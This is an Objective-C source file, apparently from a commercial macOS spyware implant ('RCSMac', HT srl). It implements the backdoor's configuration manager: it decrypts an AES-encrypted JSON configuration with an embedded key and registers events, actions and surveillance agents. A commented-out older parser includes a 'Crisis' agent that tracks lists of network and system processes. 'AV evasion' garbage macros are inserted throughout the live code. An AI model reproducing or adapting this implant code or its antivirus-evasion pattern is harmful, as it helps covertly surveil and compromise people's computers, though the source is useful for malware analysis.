/*
 * RCSMac - ConfiguraTor(i)
 *  This class will be responsible for all the required operations on the 
 *  configuration file.
 *
 * 
 * Created by Alfredo 'revenge' Pesoli on 21/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>
#import <sys/types.h>
#include <wchar.h>

#import "RCSMCommon.h"

#import "RCSMConfManager.h"
#import "RCSMTaskManager.h"
#import "RCSMEncryption.h"
#import "RCSMUtils.h"
#import "RCSMDiskQuota.h"
#import "RCSIJSonConfiguration.h"
#import "RCSMGlobals.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

#pragma mark -
#pragma mark Private Interface
#pragma mark -

//@interface __m_MConfManager (hidden)
//
//- (BOOL)_searchDataForToken: (NSData *)data
//                      token: (char *)token
//                   position: (u_long *)outPosition;
//
//- (u_long)_parseEvents:   (NSData *)aData nTimes: (int)nTimes;
//- (BOOL)_parseActions:    (NSData *)aData nTimes: (int)nTimes;
//- (BOOL)_parseAgents:     (NSData *)aData nTimes: (int)nTimes;
//
//@end
//
//#pragma mark -
//#pragma mark Private Implementation
//#pragma mark -
//
//@implementation __m_MConfManager (hidden)
//
//- (BOOL)_searchDataForToken: (NSData *)data
//                      token: (char *)token
//                   position: (u_long *)outPosition
//{
//  u_long counter = 0;
//  
//  for (;;)
//    { 
//      if (!strcmp((char *)[data bytes] + counter, token))
//        {
//          *(outPosition) = counter;
//          return YES;
//        }
//      
//      counter += 1;
//    }
//  
//  return NO;
//}
//
////
//// Quick Note
////  After the event section there all the raw actions, thus we need to call
////  the parseActions right after this /* No comment */
////
//- (u_long)_parseEvents: (NSData *)aData nTimes: (int)nTimes
//{
//  eventStruct *header;
//  NSData *rawHeader;
//  int i;
//  int pos = 0;
//  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
//  
//  for (i = 0; i < nTimes; i++)
//    {
//      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
//                                 length: sizeof(eventStruct)];
//      
//      header = (eventStruct *)[rawHeader bytes];
//#ifdef DEBUG_CONF_MANAGER
//      verboseLog(@"event size: %x", header->internalDataSize);
//      verboseLog(@"event type: %x", header->type);
//#endif
//      if (header->internalDataSize)
//        {
//          NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
//                                            length: header->internalDataSize];
//          //infoLog(@"event data: %@", tempData);
//          
//          [taskManager registerEvent: tempData
//                                type: header->type
//                              action: header->actionID];
//        }
//      else
//        [taskManager registerEvent: nil
//                              type: header->type
//                            action: header->actionID];
//      
//      // Jump to the next event (dataSize + PAD)
//      pos += header->internalDataSize + 0xC;
//      //infoLog(@"pos %x", pos);
//    }
//  
//  return pos + 0x10;
//}
//
//- (BOOL)_parseActions: (NSData *)aData nTimes: (int)nTimes
//{
//  actionContainerStruct *headerContainer;
//  actionStruct *header;
//  NSData *rawHeader;
//  int i, z;
//  int pos = 0;
//  
//  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
//  
//  for (i = 0; i < nTimes; i++)
//    {      
//      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
//                                 length: sizeof(actionContainerStruct)];
//      //infoLog(@"RAW Header: %@", rawHeader);
//
//      headerContainer = (actionContainerStruct *)[rawHeader bytes];
//      //infoLog(@"subactions (%d)", headerContainer->numberOfSubActions);
//
//      pos += sizeof(actionContainerStruct);
//      //infoLog(@"subactions: %d", headerContainer->numberOfSubActions);
//      //pos += headerContainer->internalDataSize;
//      
//      for (z = 0; z < headerContainer->numberOfSubActions; z++)
//        {
//          rawHeader = [NSData dataWithBytes: [aData bytes] + pos
//                                     length: sizeof(actionStruct)];
//          header = (actionStruct *)[rawHeader bytes];
//#ifdef DEBUG_CONF_MANAGER
//          verboseLog(@"RAW Header: %@", rawHeader);
//          verboseLog(@"action type: %x", header->type);
//          verboseLog(@"action size: %x", header->internalDataSize);
//#endif
//          if (header->internalDataSize > 0)
//            {
//              NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0x8
//                                                length: header->internalDataSize];
//              
//              //infoLog(@"%@", tempData);
//              pos += header->internalDataSize + 0x8;
//              
//              [taskManager registerAction: tempData
//                                     type: header->type
//                                   action: i];
//            }
//          else
//            {
//              [taskManager registerAction: nil
//                                     type: header->type
//                                   action: i];
//              
//              pos += sizeof(int) << 1;
//            }
//        }
//    }
//  
//  return YES;
//}
//
//- (void)initCrisisAgentParamsWithData: (NSData*)aData
//                            andStatus: (UInt32)aStatus
//{
//#ifdef DEBUG_CONF_MANAGER
//  infoLog(@"parse Crisis agent structs core %@", [[NSBundle mainBundle] executablePath]);
//#endif
//  
//  if (gAgentCrisisApp != nil) 
//  {
//    [gAgentCrisisApp release];
//    gAgentCrisisApp = nil;
//  }
//  
//  if (gAgentCrisisNet != nil) 
//  {
//    [gAgentCrisisNet release];
//    gAgentCrisisNet = nil;
//  }
//  
//  crisisConfStruct *crisis_conf = (crisisConfStruct *)[aData bytes];
//  
//  char *process_name = crisis_conf->process_names;
//  
//  if (crisis_conf->check_network)
//  {
//    for (int i=0; i<crisis_conf->network_process_count; i++) 
//    {
//      int len = _utf16len((unichar*)process_name) * sizeof(unichar);
//      
//  #ifdef DEBUG_CONF_MANAGER
//      NSData *tmpD = [[NSData alloc] initWithBytes: process_name length: 8];
//      
//      infoLog(@"process_name bytes (%@)", tmpD);
//      
//      [tmpD release];
//  #endif
//      
//      NSString *tmpAppName = [[NSString alloc] initWithBytes: process_name 
//                                                      length: len 
//                                                    encoding: NSUTF16LittleEndianStringEncoding];
//      
//  #ifdef DEBUG_CONF_MANAGER
//      infoLog(@"network_process no. %d %@ len (%d)", i, tmpAppName, len);
//  #endif
//      
//      if (gAgentCrisisNet == nil)
//        gAgentCrisisNet = [[NSMutableArray alloc] initWithCapacity: 0];
//      
//      [gAgentCrisisNet addObject: (id)tmpAppName];
//      
//      [tmpAppName release];
//      
//      process_name += (len+sizeof(unichar)); 
//    }
//  }
//  
//  if (crisis_conf->check_system)
//  {
//    for (int i=0; i<crisis_conf->system_process_count; i++) 
//    {
//      int len =_utf16len((unichar*)process_name)*sizeof(unichar);
//      
//  #ifdef DEBUG_CONF_MANAGER
//      NSData *tmpD = [[NSData alloc] initWithBytes: process_name length: 8];
//      
//      infoLog(@"process_name bytes (%@)", tmpD);
//      
//      [tmpD release];
//  #endif
//      
//      NSString *tmpAppName = [[NSString alloc] initWithBytes: process_name 
//                                                      length: len 
//                                                    encoding: NSUTF16LittleEndianStringEncoding];
//      if (gAgentCrisisApp == nil)
//        gAgentCrisisApp = [[NSMutableArray alloc] initWithCapacity: 0];
//      
//  #ifdef DEBUG_CONF_MANAGER
//      infoLog(@"system_process no. %d (%@) len (%d)", i, tmpAppName, len);
//  #endif
//      
//      [gAgentCrisisApp addObject: (id)tmpAppName];
//      
//      [tmpAppName release];
//      
//      process_name += (len+sizeof(unichar)); 
//    }
//  }
//  
//  if (aStatus == 0) 
//  {
//#ifdef DEBUG_CONF_MANAGER
//    infoLog(@"Crisis agent stopped by default");
//#endif
//    gAgentCrisis = CRISIS_STOP;
//  }
//  else
//  {
//#ifdef DEBUG_CONF_MANAGER
//    infoLog(@"Crisis agent started by default");
//#endif
//    gAgentCrisis = CRISIS_START;  
//  }
//}
//
//- (BOOL)_parseAgents: (NSData *)aData nTimes: (int)nTimes
//{
//  agentStruct *header;
//  NSData *rawHeader, *tempData;
//  int i;
//  u_long pos = 0;
//  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
//  
//  for (i = 0; i < nTimes; i++)
//    {
//      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
//                                 length: sizeof(agentStruct)];
//      
//      header = (agentStruct *)[rawHeader bytes];
//      
//#ifdef DEBUG_CONF_MANAGER
//      infoLog(@"agent ID: %x", header->agentID);
//      infoLog(@"agent status: %d", header->status);
//#endif
//      
//      if (header->internalDataSize)
//        {
//          // Workaround for re-run agent DEVICE every sync
//          if (header->agentID == LOGTYPE_DEVICE)
//            {
//              deviceStruct tmpDevice;
//
//              if (header->status == 1)
//                tmpDevice.isEnabled = AGENT_DEV_ENABLED;
//              else
//                tmpDevice.isEnabled = AGENT_DEV_NOTENABLED;
//
//              tempData = [NSData dataWithBytes: &tmpDevice length: sizeof(deviceStruct)];
//
//              memcpy((void*)[tempData bytes], (void*)[aData bytes] + pos + 0xC, sizeof(UInt32)); 
//
//#ifdef DEBUG_CONF_MANAGER
//              infoLog(@"AGENT DEVICE additional header %@", tempData);
//#endif
//            }
//          else
//            {
//              tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
//                                        length: header->internalDataSize];
//            }
//          //infoLog(@"%@", tempData);
//          // Jump to the next event (dataSize + PAD)
//          pos += header->internalDataSize + 0xC;
//          
//          // Configure Crisis params
//          if (header->agentID == AGENT_CRISIS)
//            {
//              [self initCrisisAgentParamsWithData: tempData
//                                        andStatus: header->status];
//            }
//          
//#ifdef DEBUG_CONF_MANAGER
//          verboseLog(@"agent 0x%x: %@", header->agentID, tempData);
//#endif
//          [taskManager registerAgent: tempData
//                             agentID: header->agentID
//                              status: header->status];
//        }
//      else
//        {
//          pos += 0xC;
//          
//          [taskManager registerAgent: nil
//                             agentID: header->agentID
//                              status: header->status];
//        }
//      
//      //infoLog(@"pos %x", pos);
//    }
//  
//  return pos + 0x10;
//}
//
//@end

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation __m_MConfManager

- (id)initWithBackdoorName: (NSString *)aName
{
  self = [super init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (self != nil)
    {
#ifdef DEV_MODE
//      unsigned char result[CC_MD5_DIGEST_LENGTH];
//      CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
//
//      NSData *temp = [NSData dataWithBytes: result
//                                    length: CC_MD5_DIGEST_LENGTH];
    NSData *temp = [NSData dataWithBytes: gConfAesKey
                                  length: CC_MD5_DIGEST_LENGTH];
#else
      NSData *temp = [NSData dataWithBytes: gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      mEncryption = [[__m_MEncryption alloc] initWithKey: temp];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return self;
}

- (void)dealloc
{
  [mEncryption release];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [super dealloc];
}


- (BOOL)checkConfigurationIntegrity: (NSString *)configurationFile
{
  // FIXED-
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  // configuration retained by decryptJSonConfiguration
  NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (configuration == nil) 
  {
    [pool release];
    return NO;
  }
  else // FIXED-
    [configuration release];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [pool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  return YES;
}

- (BOOL)loadConfiguration
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  NSString *configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
                                 [[NSBundle mainBundle] bundlePath],
                                 gConfigurationName];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [configurationFile release];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if (configuration == nil)
    {
      // FIXED-
      [pool release];
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // For safety we remove all the previous objects
  [taskManager removeAllElements];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  SBJSonConfigDelegate *jSonDel = [[SBJSonConfigDelegate alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  // Running the parser and populate the lists
  BOOL bRet = [jSonDel runParser: configuration 
                      WithEvents: [taskManager mEventsList] 
                      andActions: [taskManager mActionsList] 
                      andModules: [taskManager mAgentsList]];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [jSonDel release];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  //FIXED-
  [configuration release];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  [pool release];
  
  return bRet;
}

- (__m_MEncryption *)encryption
{  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return mEncryption;
}

@end
